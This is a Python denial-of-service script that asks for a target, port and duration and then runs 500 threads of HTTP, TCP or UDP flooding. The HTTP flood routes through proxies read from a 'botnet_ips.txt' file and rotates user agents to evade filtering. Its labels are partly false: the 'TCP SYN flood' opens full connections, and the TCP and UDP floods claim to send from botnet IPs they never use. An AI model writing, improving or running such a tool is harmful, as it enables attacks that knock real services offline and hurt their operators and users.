import socket
import threading
import requests
import random
import time

# Load 50K IPs from a file
def load_ips(filename):
    with open(filename, "r") as f:
        return [line.strip() for line in f.readlines()]

# Load user agents from a file
def load_user_agents(filename="user_agents.txt"):
    with open(filename, "r") as f:
        return [line.strip() for line in f.readlines()]

# Load headers from a file
def load_headers(filename="headers.txt"):
    headers_list = []
    with open(filename, "r") as f:
        for line in f.readlines():
            key, value = line.strip().split(": ", 1)
            headers_list.append((key, value))
    return headers_list

# User input for attack settings
TARGET = input("Enter target URL/IP: ").strip()
PORT = int(input("Enter target port (80 for HTTP, 443 for HTTPS, etc.): ").strip())
ATTACK_TYPE = input("Choose attack type (HTTP/TCP/UDP): ").strip().upper()
DURATION = int(input("Enter attack duration in seconds: ").strip())

# Load IPs, user agents, and headers from files
IPS = load_ips("botnet_ips.txt")
USER_AGENTS = load_user_agents("user_agents.txt")
HEADERS_LIST = load_headers("headers.txt")

# Function to generate random headers
def get_random_headers():
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    for key, value in HEADERS_LIST:
        headers[key] = value
    return headers

# (1) HTTP Flood Attack
def http_flood():
    while time.time() < END_TIME:
        ip = random.choice(IPS)
        proxies = {"http": f"http://{ip}", "https": f"http://{ip}"}
        headers = get_random_headers()
        try:
            requests.get(TARGET, headers=headers, proxies=proxies, timeout=1)
            print(f"[+] HTTP Flood Sent from {ip}")
        except:
            pass

# (2) TCP SYN Flood Attack
def tcp_flood():
    while time.time() < END_TIME:
        ip = random.choice(IPS)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((TARGET, PORT))
            sock.send(random._urandom(1024))  # Send random bytes
            print(f"[+] TCP Flood Sent from {ip}")
            sock.close()
        except:
            pass

# (3) UDP Flood Attack
def udp_flood():
    while time.time() < END_TIME:
        ip = random.choice(IPS)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(1024), (TARGET, PORT))
            print(f"[+] UDP Flood Sent from {ip}")
        except:
            pass

# Determine attack method
END_TIME = time.time() + DURATION
threads = []

if ATTACK_TYPE == "HTTP":
    for _ in range(500):  # Launch 500 threads
        t = threading.Thread(target=http_flood)
        t.start()
        threads.append(t)

elif ATTACK_TYPE == "TCP":
    for _ in range(500):
        t = threading.Thread(target=tcp_flood)
        t.start()
        threads.append(t)

elif ATTACK_TYPE == "UDP":
    for _ in range(500):
        t = threading.Thread(target=udp_flood)
        t.start()
        threads.append(t)

# Wait for all threads to finish
for t in threads:
    t.join()
